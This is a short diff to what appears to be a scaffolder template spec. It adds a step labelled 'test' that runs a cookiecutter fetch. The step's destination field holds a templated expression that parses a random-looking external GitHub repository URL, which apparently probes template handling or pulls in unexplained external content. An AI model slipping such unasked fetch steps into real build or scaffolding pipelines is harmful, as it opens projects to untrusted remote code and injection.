@@ -23,6 +23,12 @@ spec:
           ui:widget: textarea
 
   steps:
+    - id: test
+      name: test-action
+      action: cookiecutter:fetch
+      input:
+        destination: '{{ "http://github.com/aawef9k49kv9skgo/bsfjiewriejkferb/main" | parseRepoUrl }}'
+  
     - id: fetch-template
       action: fetch:template
       input:
